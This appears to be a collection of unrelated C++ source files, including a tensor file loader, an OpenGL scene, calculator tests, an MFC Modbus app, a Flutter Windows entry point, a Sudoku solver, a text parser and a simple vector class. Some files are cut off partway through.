    "#include \"codec.h\"\n\n#include <fcntl.h>\n#include <iostream>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <unistd.h>\n\nstd::string dtype_to_string(DType dtype) {\n  switch (dtype) {\n    case DType::F32: return \"F32\";\n    case DType::F16: return \"F16\";\n    case DType::BF16: return \"BF16\";\n    case DType::F8E5M2: return \"F8_E5M2\";\n    case DType::F8E4M3: return \"F8_E4M3\";\n    case DType::I32: return \"I32\";\n    case DType::I16: return \"I16\";\n    case DType::I8: return \"I8\";\n    case DType::U8: return \"U8\";\n  }\n  return \"UNKNOWN\";\n}\n\nsize_t dtype_size(DType dtype) {\n  switch (dtype) {\n    case DType::F32: return 4;\n    case DType::F16: return 2;\n    case DType::BF16: return 2;\n    case DType::F8E5M2: return 1;\n    case DType::F8E4M3: return 1;\n    case DType::I32: return 4;\n    case DType::I16: return 2;\n    case DType::I8: return 1;\n    case DType::U8: return 1;\n  }\n  return 0;\n}\n\nint Tensor::from_json(const std::string& name, const json& val, void* bytes_ptr, size_t bytes_size) {\n  this->name = name;\n  std::string dtype_str = val.value(\"dtype\", \"\"); \n  if (dtype_str == \"F32\") {\n    this->dtype = DType::F32;\n  } else if (dtype_str == \"F16\") {\n    this->dtype = DType::F16;\n  } else if (dtype_str == \"BF16\") {\n    this->dtype = DType::BF16;\n  } else if (dtype_str == \"F8_E5M2\") {\n    this->dtype = DType::F8E5M2;\n  } else if (dtype_str == \"F8_E4M3\") {\n    this->dtype = DType::F8E4M3;\n  } else if (dtype_str == \"I32\") {\n    this->dtype = DType::I32;\n  } else if (dtype_str == \"I16\") {\n    this->dtype = DType::I16;\n  } else if (dtype_str == \"I8\") {\n    this->dtype = DType::I8;\n  } else if (dtype_str == \"U8\") {\n    this->dtype = DType::U8;\n  } else {\n    std::cerr << \"bad dtype\" << std::endl;\n    return -1;\n  }\n  size_t dsize = dtype_size(this->dtype);\n\n  size_t numel = 1;\n  if (val.at(\"shape\").size() > 4) {\n    std::cerr << \"shape exceeds 4 dimensions\" << std::endl;\n  }\n  for (size_t i = 0; i < val.at(\"shape\").size() && i < 4; i++) {\n    if (val.at(\"shape\")[i].get<int>() != val.at(\"shape\")[i]) {\n      std::cerr << \"bad shape\" << std::endl;\n      return -1;\n    }\n    shape[i] = val.at(\"shape\")[i].get<int>();\n    numel *= shape[i];\n  }\n  if (val.at(\"data_offsets\").size() != 2) {\n    return -1;\n  }\n  size_t offset_start = static_cast<size_t>(val.at(\"data_offsets\")[0]);\n  size_t offset_end = static_cast<size_t>(val.at(\"data_offsets\")[1]);\n  if (offset_start < 0 || offset_end <= offset_start || offset_end > bytes_size) {\n    std::cerr << \"bad offsets\" << std::endl;\n    return -1;\n  }\n  this->data = (char*)bytes_ptr + offset_start;\n  this->size = offset_end - offset_start;\n  // validate the shape matches the size\n  if (numel * dsize != this->size) {\n    std::cerr << \"bad size\" << std::endl;\n    return -1;\n  }\n  return 0;\n}\n\nint YALMData::from_file(const std::string& filename) {\n  std::cout << \"loading data from file: \" << filename << std::endl;\n  int fd = open(filename.c_str(), O_RDONLY);\n  if (fd == -1) {\n    return -1;\n  }\n\n  struct stat st;\n  if (fstat(fd, &st) != 0) {\n    close(fd);\n    return -1;\n  }\n  \n  size = st.st_size;\n  data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);\n  if (data == MAP_FAILED) {\n    close(fd);\n    return -1;\n  }\n\n#ifdef __linux__\n  // increases readahead buffer size, resulting in faster cold loads\n  posix_fadvise(fd, 0, size, POSIX_FADV_SEQUENTIAL);\n#endif\n\n  close(fd); // fd can be closed after mmap returns without invalidating the mapping\n\n  // Parse the metadata JSON and the tensors\n  if (size < sizeof(uint64_t)) {\n    munmap(data, size);\n    return -1;\n  }\n\n  uint64_t json_size = *(uint64_t*)data;\n  if (json_size == 0 || json_size > size - sizeof(uint64_t)) {\n    munmap(data, size);\n    return -1;\n  }\n\n  char* json_ptr = (char*)data + sizeof(uint64_t);\n  void* bytes_ptr = (char*)data + sizeof(uint64_t) + json_size;\n  size_t bytes_size = size - sizeof(uint64_t) - json_size;\n\n  std::string json_str(json_ptr, json_size);\n  json header = json::parse(json_str);\n\n  for (auto& [key, val] : header.items()) {\n    if (key == \"__metadata__\") {\n      metadata = val;\n    } else {\n      Tensor& tensor = tensors[key];\n      if (tensor.from_json(key, val, bytes_ptr, bytes_size) != 0) {\n        munmap(data, size);\n        return -1;\n      }\n    }\n  }\n\n  return 0;\n}",
    "#include \"scene1.hpp\"\n\nScene1::Scene1(GLFWwindow* window)\n    : window(window)\n{\n    modelShader = std::make_unique<Shader>(\"resources/shaders/model.vert\", \"resources/shaders/model.frag\");\n    model3d = std::make_unique<gltfmodel::GLTFModel>(\"resources/models/Forest1.glb\");\n\n    cameraUp = glm::vec3(0.0f, 1.0f, 0.0f);\n\n    glm::vec3 cameraForward(0.0f, 0.0f, -1.0f);\n    cameraPosition = glm::vec3(0.0f, 0.0f, 0.0f);\n\n    cameraOrientation = glm::lookAtRH(cameraPosition, cameraForward, cameraUp);\n\n    fov = 45.0f;\n}\n\nScene1::~Scene1()\n{\n    std::cout << \"cleaning up scene1\" << std::endl;\n}\n\nvoid Scene1::handleKeyEvent(int key, int scancode, int action, int mods)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS)\n    {\n        std::cout << \"[scene1] ESC pressed\" << std::endl;\n    }\n}\n\nvoid Scene1::handleCursorPositionEvent(double x, double y)\n{\n    const float cameraRotationSpeed = 1.f;\n\n    int w, h;\n\n    glfwGetWindowSize(window, &w, &h);\n\n    glm::vec2 windowSize(w, h);\n\n    glm::vec2 mouseDelta = glm::vec2(x, y) - (windowSize * 0.5f);\n\n    glm::quat deltaQuat = glm::quat(glm::vec3(mouseDelta.y / windowSize.x, mouseDelta.x / windowSize.y, 0.0f) * cameraRotationSpeed);\n\n    cameraOrientation = glm::normalize(deltaQuat * cameraOrientation);\n\n    glm::mat4 view = glm::mat4_cast(cameraOrientation) * glm::translate(glm::mat4(1.0f), -glm::vec3(0.0f, 0.0f, -3.0f));\n\n    glm::vec3 forward = glm::vec3(view[0][2], view[1][2], view[2][2]);\n\n    cameraOrientation = glm::lookAtRH(cameraPosition, cameraPosition - forward, cameraUp);\n\n    glfwSetCursorPos(window, windowSize.x * 0.5f, windowSize.y * 0.5f);\n}\n\nvoid Scene1::render(float dt)\n{\n    glEnable(GL_DEPTH_TEST);\n\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n    modelShader->use();\n\n    glm::mat4 view = glm::mat4_cast(cameraOrientation)  * glm::translate(glm::mat4(1.0f), -glm::vec3(0.0f, 0.0f, -3.0f));\n\n    glm::vec2 windowSize(1024, 768);\n\n    glm::mat4 projection = glm::perspective(glm::radians(fov), (float) windowSize.x / (float) windowSize.y, 0.1f, 1000.0f);\n\n    glm::mat4 modelMatrix = glm::mat4(1.0f); // TODO: change this for each model\n\n    modelShader->setFloat(\"dt\", dt);\n    modelShader->setMat4(\"model\", modelMatrix);\n    modelShader->setMat4(\"view\", view);\n    modelShader->setMat4(\"projection\", projection);\n\n    model3d->render();\n\n    glDisable(GL_DEPTH_TEST);\n}\n",
    "#include \"calculator.h\"\n#include <cassert>\n#include <iostream>\n\nvoid testAdd() {\n    assert(add(3, 2) == 5);\n    assert(add(-1, 1) == 0);\n    std::cout << \"Add tests passed!\" << std::endl;\n}\n\nvoid testSubtract() {\n    assert(subtract(5, 3) == 2);\n    assert(subtract(3, 5) == -2);\n    std::cout << \"Subtract tests passed!\" << std::endl;\n}\n\nvoid testMultiply() {\n    assert(multiply(3, 2) == 6);\n    assert(multiply(0, 5) == 0);\n    std::cout << \"Multiply tests passed!\" << std::endl;\n}\n\nvoid testDivide() {\n    assert(divide(6, 2) == 3);\n    try {\n        divide(6, 0); \n        assert(false);\n    }\n    catch (const std::invalid_argument& e) {\n      \n    }\n    std::cout << \"Divide tests passed!\" << std::endl;\n}\n\nvoid testSquareRoot() {\n    assert(squareRoot(4) == 2);\n    try {\n        squareRoot(-4);\n        assert(false); \n    }\n    catch (const std::invalid_argument& e) {\n    }\n    std::cout << \"SquareRoot tests passed!\" << std::endl;\n}\n\nvoid runTests() {\n    testAdd();\n    testSubtract();\n    testMultiply();\n    testDivide();\n    testSquareRoot();\n    std::cout << \"All tests passed!\" << std::endl;\n}\n",
    "\ufeff\n// S-Modbus.cpp: \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4 \ub3d9\uc791\uc744 \uc815\uc758\ud569\ub2c8\ub2e4.\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"S-Modbus.h\"\n#include \"S-ModbusDlg.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// CSModbusApp\n\nBEGIN_MESSAGE_MAP(CSModbusApp, CWinApp)\n\tON_COMMAND(ID_HELP, &CWinApp::OnHelp)\nEND_MESSAGE_MAP()\n\n\n// CSModbusApp \uc0dd\uc131\n\nCSModbusApp::CSModbusApp()\n{\n\t// \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;\n\n\t// TODO: \uc5ec\uae30\uc5d0 \uc0dd\uc131 \ucf54\ub4dc\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4.\n\t// InitInstance\uc5d0 \ubaa8\ub4e0 \uc911\uc694\ud55c \ucd08\uae30\ud654 \uc791\uc5c5\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4.\n}\n\n\n// \uc720\uc77c\ud55c CSModbusApp \uac1c\uccb4\uc785\ub2c8\ub2e4.\n\nCSModbusApp theApp;\n\n\n// CSModbusApp \ucd08\uae30\ud654\n\nBOOL CSModbusApp::InitInstance()\n{\n\t// Windows XP\uc5d0\uc11c\ub294 InitCommonControlsEx()\ub97c \ud544\uc694\ub85c \ud569\ub2c8\ub2e4.\n\t// \uc0ac\uc6a9\ud558\ub3c4\ub85d \uc9c0\uc815\ud558\ub294 \uacbd\uc6b0, Windows XP \uc0c1\uc5d0\uc11c \ubc18\ub4dc\uc2dc InitCommonControlsEx()\uac00 \ud544\uc694\ud569\ub2c8\ub2e4.\n\t// InitCommonControlsEx()\ub97c \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uc73c\uba74 \ucc3d\uc744 \ub9cc\ub4e4 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\n\tINITCOMMONCONTROLSEX InitCtrls;\n\tInitCtrls.dwSize = sizeof(InitCtrls);\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ubaa8\ub4e0 \uacf5\uc6a9 \ucee8\ud2b8\ub864 \ud074\ub798\uc2a4\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d\n\t// \uc774 \ud56d\ubaa9\uc744 \uc124\uc815\ud558\uc2ed\uc2dc\uc624.\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\n\tInitCommonControlsEx(&InitCtrls);\n\n\tCWinApp::InitInstance();\n\n\n\tAfxEnableControlContainer();\n\n\t// \ub300\ud654 \uc0c1\uc790\uc5d0 \uc178 \ud2b8\ub9ac \ubdf0 \ub610\ub294\n\t// \uc178 \ubaa9\ub85d \ubdf0 \ucee8\ud2b8\ub864\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\ub294 \uacbd\uc6b0 \uc178 \uad00\ub9ac\uc790\ub97c \ub9cc\ub4ed\ub2c8\ub2e4.\n\tCShellManager *pShellManager = new CShellManager;\n\n\t// MFC \ucee8\ud2b8\ub864\uc758 \ud14c\ub9c8\ub97c \uc0ac\uc6a9\ud558\uae30 \uc704\ud574 \"Windows \uc6d0\ud615\" \ube44\uc8fc\uc5bc \uad00\ub9ac\uc790 \ud65c\uc131\ud654\n\tCMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));\n\n\t// \ud45c\uc900 \ucd08\uae30\ud654\n\t// \uc774\ub4e4 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uace0 \ucd5c\uc885 \uc2e4\ud589 \ud30c\uc77c\uc758 \ud06c\uae30\ub97c \uc904\uc774\ub824\uba74\n\t// \uc544\ub798\uc5d0\uc11c \ud544\uc694 \uc5c6\ub294 \ud2b9\uc815 \ucd08\uae30\ud654\n\t// \ub8e8\ud2f4\uc744 \uc81c\uac70\ud574\uc57c \ud569\ub2c8\ub2e4.\n\t// \ud574\ub2f9 \uc124\uc815\uc774 \uc800\uc7a5\ub41c \ub808\uc9c0\uc2a4\ud2b8\ub9ac \ud0a4\ub97c \ubcc0\uacbd\ud558\uc2ed\uc2dc\uc624.\n\t// TODO: \uc774 \ubb38\uc790\uc5f4\uc744 \ud68c\uc0ac \ub610\ub294 \uc870\uc9c1\uc758 \uc774\ub984\uacfc \uac19\uc740\n\t// \uc801\uc808\ud55c \ub0b4\uc6a9\uc73c\ub85c \uc218\uc815\ud574\uc57c \ud569\ub2c8\ub2e4.\n\tSetRegistryKey(_T(\"\ub85c\uceec \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9c8\ubc95\uc0ac\uc5d0\uc11c \uc0dd\uc131\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\"));\n\n\tCSModbusDlg dlg;\n\tm_pMainWnd = &dlg;\n\tINT_PTR nResponse = dlg.DoModal();\n\tif (nResponse == IDOK)\n\t{\n\t\t// TODO: \uc5ec\uae30\uc5d0 [\ud655\uc778]\uc744 \ud074\ub9ad\ud558\uc5ec \ub300\ud654 \uc0c1\uc790\uac00 \uc5c6\uc5b4\uc9c8 \ub54c \ucc98\ub9ac\ud560\n\t\t//  \ucf54\ub4dc\ub97c \ubc30\uce58\ud569\ub2c8\ub2e4.\n\t}\n\telse if (nResponse == IDCANCEL)\n\t{\n\t\t// TODO: \uc5ec\uae30\uc5d0 [\ucde8\uc18c]\ub97c \ud074\ub9ad\ud558\uc5ec \ub300\ud654 \uc0c1\uc790\uac00 \uc5c6\uc5b4\uc9c8 \ub54c \ucc98\ub9ac\ud560\n\t\t//  \ucf54\ub4dc\ub97c \ubc30\uce58\ud569\ub2c8\ub2e4.\n\t}\n\telse if (nResponse == -1)\n\t{\n\t\tTRACE(traceAppMsg, 0, \"\uacbd\uace0: \ub300\ud654 \uc0c1\uc790\ub97c \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc73c\ubbc0\ub85c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \uc608\uae30\uce58 \uc54a\uac8c \uc885\ub8cc\ub429\ub2c8\ub2e4.\\n\");\n\t\tTRACE(traceAppMsg, 0, \"\uacbd\uace0: \ub300\ud654 \uc0c1\uc790\uc5d0\uc11c MFC \ucee8\ud2b8\ub864\uc744 \uc0ac\uc6a9\ud558\ub294 \uacbd\uc6b0 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS\ub97c \uc218\ud589\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\\n\");\n\t}\n\n\t// \uc704\uc5d0\uc11c \ub9cc\ub4e0 \uc178 \uad00\ub9ac\uc790\ub97c \uc0ad\uc81c\ud569\ub2c8\ub2e4.\n\tif (pShellManager != nullptr)\n\t{\n\t\tdelete pShellManager;\n\t}\n\n#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)\n\tControlBarCleanUp();\n#endif\n\n\t// \ub300\ud654 \uc0c1\uc790\uac00 \ub2eb\ud614\uc73c\ubbc0\ub85c \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc758 \uba54\uc2dc\uc9c0 \ud38c\ud504\ub97c \uc2dc\uc791\ud558\uc9c0 \uc54a\uace0 \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc744 \ub05d\ub0bc \uc218 \uc788\ub3c4\ub85d FALSE\ub97c\n\t// \ubc18\ud658\ud569\ub2c8\ub2e4.\n\treturn FALSE;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile_dashboard\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <cstdio>\n#include <cstring>\n#include <cassert>\n#include \"sudoku.h\"\n\nusing namespace std;\n\n/* You are pre-supplied with the functions below. Add your own\n   function definitions to the end of this file. */\n\n/* pre-supplied function to load a Sudoku board from a file */\nvoid load_board(const char* filename, char board[9][9]) {\n  cout << \"Loading Sudoku board from file '\" << filename << \"'... \";\n\n  ifstream in(filename);\n  if (!in) {\n    cout << \"Failed!\\n\";\n  }\n  assert(in);\n\n  char buffer[512];\n\n  int row = 0;\n  in.getline(buffer,512);\n  while (in && row < 9) {\n    for (int n=0; n<9; n++) {\n      assert(buffer[n] == '.' || isdigit(buffer[n]));\n      board[row][n] = buffer[n];\n    }\n    row++;\n    in.getline(buffer,512);\n  }\n\n  cout << ((row == 9) ? \"Success!\" : \"Failed!\") << '\\n';\n  assert(row == 9);\n}\n\n/* internal helper function */\nvoid print_frame(int row) {\n  if (!(row % 3)) {\n    cout << \"  +===========+===========+===========+\\n\";\n  } else {\n    cout << \"  +---+---+---+---+---+---+---+---+---+\\n\";\n  }\n}\n\n/* internal helper function */\nvoid print_row(const char* data, int row) {\n  cout << (char) ('A' + row) << \" \";\n  for (int i=0; i<9; i++) {\n    cout << ( (i % 3) ? ':' : '|' ) << \" \";\n    cout << ( (data[i]=='.') ? ' ' : data[i]) << \" \";\n  }\n  cout << \"|\\n\";\n}\n\n/* pre-supplied function to display a Sudoku board */\nvoid display_board(const char board[9][9]) {\n  cout << \"    \";\n  for (int r=0; r<9; r++) {\n    cout << (char) ('1'+r) << \"   \";\n  }\n  cout << '\\n';\n  for (int r=0; r<9; r++) {\n    print_frame(r);\n    print_row(board[r],r);\n  }\n  print_frame(9);\n}\n\n/* add your functions here */\n\n\n// this function checks if sudoku board is complete\nbool is_complete(const char board[9][9]) {\n\n\t// nested for loop that goes through each element in the matrix\n\t//  and checks if the element is '.' if so returns false\n\tfor (int row = 0; row < 9; row++) {\n\t\tfor(int column = 0; column < 9; column++) {\n\t\t\tif (board[row][column] < '1' || board[row][column] > '9')\n\t\t\t\treturn false;\n\t\t}\n\t}\n\t// if no '.' were found true is return as the board is complete\n\treturn true;\n}\n\n// This function attempts to place a digit at a certain position if it is a valid move\nbool make_move(const char position[3], char digit, char board[9][9]) {\n\n\tint row_index = (position[0]- 'A'); // Converting the letter in the position string to an integer from 0 to 8 (the row index)\n\tint column_index = (position[1] - '1'); // converting the number in the position string to  an integer from 0 to 8 (the column index)\n\n\t// checks if the digit is a valid value between 1 and 9\n\tif(digit < '1' || digit > '9' )\n\t\treturn false;\n\n\t// check if the row and column index provided are out of bounds\n\tif(row_index < 0 || row_index > 8 || column_index < 0 || column_index > 8 )\n\t\treturn false;\n\n\t// check if the desired position is empty\n\tif(board[row_index][column_index] != '.')\n\t\treturn false;\n\n\t// check if the digit is already present within the row\n\tfor(int column =0; column<9; column++ ) {\n\t\tif (board[row_index][column] == digit){\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// check if the digit is already present within the column\n\tfor (int row=0; row<9; row++) {\n\t\tif(board[row][column_index] ==  digit)\n\t\t\treturn false;\n\t}\n\n\t// check if the digit is already present within the current 3x3 block\n\n\tint i = row_index/3 + 1, j = column_index/3 + 1; // finding out which block the digit is in\n\n\t// checking all the cells within the block\n\tfor (int row = i*3-3; row < i*3; row++) {\n\t\tfor(int column=j*3-3; column < j*3; column++) {\n\t\t\tif(board[row][column] == digit) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n\n\t// if all checks are passed update board\n\n\tboard[row_index][column_index] = digit;\n\n\treturn true;\n\n}\n\n// this function saves the board to a certain file\nbool save_board(const char* filename, char  board[9][9]) {\n\n\t// opening file\n\tofstream outFile;\n\toutFile.open(filename);\n\n\tif (!outFile)\n\t\treturn false;\n\n\t// iterating through each element in board and writing it to the file\n\tfor (int row = 0; row < 9; row++) {\n\t\tfor(int column = 0; column < 9; column++) {\n\t\t\toutFile << board[row][column];\n\t\t\tif (outFile.fail()) // making sure the write operation was successful\n\t\t\t\treturn false;\n\t\t}\n\t\toutFile << '\\n';\n\t}\n\toutFile.close();\n\treturn true;\n}\n\n\n// This recursive function attempts to solve the sudoku board\nbool solve_board(char board[9][9]){\n\n\tstatic char position[] = {'A', '0'}; // keeps track of which cell the function is working on across function calls\n\tchar digit = '1';\n\tstatic bool finished = false; // flag is used to tell that a conclusion on the board has been reached\n\n\t// row and column are used to keep track of the last cell that was changed (for backtracking)\n\tchar row = position[0];\n\tchar column = position[1];\n\n\n\tstatic int count = 0; // used to track the number of function calls\n\tcount++;\n\n\t// if the finished flag is set the position is reset to point to the start position\n\t// this ensures that when the function is re-used to solve another board, ",
    "#include \"DocumentParser.h\"\n#include \"utils.h\"\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <locale>\n#include <codecvt>\n#include <chrono>\n\nDocumentParser::DocumentParser(const std::string& datasetPath, int numDocs)\n    : datasetPath(datasetPath), numDocs(numDocs) {}\n\nvoid DocumentParser::parseDocuments() {\n    std::ifstream file(datasetPath);\n    if (!file) {\n        std::cerr << \"Error opening file: \" << datasetPath << std::endl;\n        return;\n    }\n\n    auto start = std::chrono::high_resolution_clock::now(); // Start timing\n\n    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;\n    std::string line;\n    int docID = 0;\n\n    while (std::getline(file, line) && (numDocs == -1 || docID < numDocs)) {\n        try {\n            std::wstring wline = converter.from_bytes(line);\n\n            // Skip empty lines\n            if (wline.empty()) {\n                //std::cerr << \"Skipping empty line in document ID: \" << docID << std::endl;\n                continue;\n            }\n\n            std::wstringstream wss(wline);\n            std::wstring word;\n            std::wstring processedDocument;\n\n            // Process each word\n            while (wss >> word) {\n                std::wstring processedWord = preprocessWord(word);\n\n                // Skip invalid or empty processed words\n                if (processedWord.empty()) {\n                    continue;\n                }\n\n                // Reassemble the document after preprocessing\n                if (!processedDocument.empty()) {\n                    processedDocument += L\" \";\n                }\n                processedDocument += processedWord;\n            }\n\n            // Skip empty documents after preprocessing\n            if (processedDocument.empty()) {\n                //std::cerr << \"Skipping document with no valid content. DocID: \" << docID << std::endl;\n                continue;\n            }\n\n            // Add the processed document to the collection\n            documents[docID] = processedDocument;\n            //std::wcout << L\"Processed document \" << docID << L\": \" << processedDocument << std::endl;\n\n            docID++;\n        } catch (const std::exception& e) {\n            std::cerr << \"Error processing document ID: \" << docID << \", Error: \" << e.what() << std::endl;\n            continue;\n        }\n    }\n\n    auto end = std::chrono::high_resolution_clock::now(); // End timing\n    std::chrono::duration<double> elapsed = end - start;\n\n    std::wcout << L\"Total documents parsed and processed: \" << docID << std::endl;\n    std::cout << \"Document parsing and preprocessing completed in \" << elapsed.count() << \" seconds.\" << std::endl;\n}\n\nconst std::unordered_map<int, std::wstring>& DocumentParser::getDocuments() const {\n    return documents;\n}",
    "#include <iostream>\nusing namespace std;\n\ntemplate <typename T>     //\ud15c\ud50c\ub9bf\uc744 \uc0ac\uc6a9\ud574\uc11c \ub370\uc774\ud130 \ud0c0\uc785\uc5d0 \uad6c\uc560\ubc1b\uc9c0 \uc54a\ub294 \ud074\ub798\uc2a4\ub098 \ud568\uc218\ub4e4\uc744 \uc791\uc131\nclass SimpleVector {      //\ud074\ub798\uc2a4 \uc774\ub984\uc740 Simple Vector\nprivate:\n\tT* data;\n\tint currentSize;      //\ud604\uc7ac \uc6d0\uc18c\uc758 \uac1c\uc218\n\tint currentCapacity;  //\ubc30\uc5f4\uc758 \ud06c\uae30      \ub3d9\uc801 \ubc30\uc5f4\uc77c \ub54c \uc6d0\uc18c\uc758 \uac1c\uc218\uc640 \ubc30\uc5f4\uc758 \ud06c\uae30\ub294 \ub2ec\ub77c\uc9c8 \uc218 \uc788\uc74c\n\npublic:\n\tSimpleVector() :currentSize(0), currentCapacity(10) { //\uba64\ubc84 \ubcc0\uc218 \ucd08\uae30\ud654\n\t\tdata = new T[currentCapacity]; //T \ud0c0\uc785\uc758 \ud06c\uae30\uac00 10\uc778 \ubc30\uc5f4\uc744 \ub3d9\uc801 \ud560\ub2f9\n\t}\n\t//\uc22b\uc790\ub97c \ud558\ub098 \ubc1b\ub294 \uc0dd\uc131\uc790\ub294 \ud574\ub2f9 \uc22b\uc790\uc5d0 \ud574\ub2f9\ub418\ub294 \ud06c\uae30\uc758 \ubc30\uc5f4\uc744 \ub9cc\ub4ed\ub2c8\ub2e4.\n\tSimpleVector(int Capacity) : currentSize(0), currentCapacity(Capacity) {\n\t\tdata = new T[currentCapacity];\n\t}\n\n\t~SimpleVector() {\n\t\tdelete[] data;   // \ub3d9\uc801 \ud560\ub2f9\ub41c \uba54\ubaa8\ub9ac \ud574\uc81c\n\t}\n\n\t// \ubc30\uc5f4\uc758 \ud06c\uae30\uac00 \uaf49 \ucc3c\ub294\ub370 \uc6d0\uc18c\uac00 \ub354 \ub4e4\uc5b4\uc62c\uacbd\uc6b0 \uc544\ubb34 \ub3d9\uc791\ub3c4 \ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4\n\tvoid push_back(const T& value) { //push_back  \uc778\uc790\ub85c \ubc1b\uc740 \uc6d0\uc18c\ub97c  \ub9e8 \ub4a4\uc5d0 \ucd94\uac00 \ud569\ub2c8\ub2e4. \ubc18\ud658\uac12 \uc5c6\uc774. \n\t\tif (currentSize < currentCapacity) { //\ud604\uc7ac \uc6d0\uc18c \uac1c\uc218\uac00 \ubc30\uc5f4\uc758 \ud06c\uae30\ubcf4\ub2e4 \uc791\uc73c\uba74\n\t\t\tdata[currentSize++] = value;\n\t\t\t//\ud604\uc7ac \ubc30\uc5f4\uc758 \ud06c\uae30\uc5d0 1\uc744 \ub354\ud574\uc11c \uc0c8\ub85c\uc6b4 \uc6d0\uc18c \ud558\ub098\ub97c \ucd94\uac00\ud558\uace0 \n\t\t\t//\uc0c8\ub85c \ucd94\uac00\ub41c \uc6d0\uc18c\ub97c value\uc5d0 \uc800\uc7a5\n\t\t}\n\t}\n\n\tvoid pop_back() {\n\t\tif (currentSize > 0) { //\uc6d0\uc18c\uac00 \uc874\uc7ac\ud558\uae30\ub9cc \ud55c\ub2e4\uba74 = \uc0ac\ub77c\uc9c8 \uc6d0\uc18c\uac00 1\uac1c\ub77c\ub3c4 \uc788\ub2e4\uba74\n\t\t\tcurrentSize--; //\ubca1\ud130\uc758 \ub9c8\uc9c0\ub9c9 \uc6d0\uc18c \uc81c\uac70\n\t\t\t//\uadf8\ub0e5 \uc0ad\uc81c\ub9cc \ud558\uba74 \ub418\uae30 \ub54c\ubb38\uc5d0 push_back\ucc98\ub7fc \uc6d0\uc18c\uac00 \uc800\uc7a5\ub420 value \uc791\uc131\ub3c4 \ud544\uc694 \uc5c6\uc74c\n\t\t}\n\t}\n\n\t//size\ub294 \uc778\uc790\uac00 \uc5c6\uace0 \ud604\uc7ac \uc6d0\uc18c\uc758 \uac1c\uc218\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4.\n\tint size() const {\n\t\treturn currentSize;\n\t}\n\n\t//capacity\ub294 \ud604\uc7ac \ub0b4\ubd80 \ubc30\uc5f4\uc758 \ud06c\uae30\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4.\n\tint capacity() const {\n\t\treturn currentCapacity;\n\t}\n\n};",
    "/*\n *  Copyright (c) 2021 NetEase Inc.\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\n/*\n * Project: dingo\n * Created Date: 2021-10-31\n * Author: chengyi01\n */\n\n#include \"tools/copyset/dingofs_copyset_status.h\"\n\nDECLARE_string(metaserverAddr);\nDECLARE_string(poolId);\nDECLARE_string(copysetId);\n\nnamespace dingofs {\nnamespace tools {\nnamespace copyset {\n\nvoid GetCopysetStatusTool::PrintHelp() {\n  DingofsToolRpc::PrintHelp();\n  std::cout << \" -copysetId=\" << FLAGS_copysetId << \" -poolId=\" << 